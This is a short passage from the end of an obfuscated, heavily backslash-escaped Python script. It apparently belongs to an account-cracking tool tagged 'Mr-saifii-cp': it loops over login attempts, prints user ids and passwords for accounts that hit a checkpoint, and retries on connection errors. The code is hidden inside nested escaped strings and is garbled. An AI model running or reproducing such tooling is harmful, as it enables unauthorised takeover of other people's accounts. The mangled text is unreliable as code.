q[\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'error\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'][\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'message\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\']:\\\\\\\\\\\\\\\\n                print("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\r {} [Mr-saifii-cp] {} {} {} {}".format(R,url,teer,pw,C))\\\\\\\\\\\\\\\\n                break\\\\\\\\\\\\\\\\n            else:\\\\\\\\\\\\\\\\n                continue\\\\\\\\\\\\\\\\n        except(CError):\\\\\\\\\\\\\\\\n            time.sleep(10)\\\\\\\\\\\\\\\\n            continue\\\\\\\\\\\\\\\\n    loop+=1\\\\\\\\\\\\\\\\nmenu()\\\\\\\\\\\\\\\'))\\\\\\\'))\\\'))\'))'))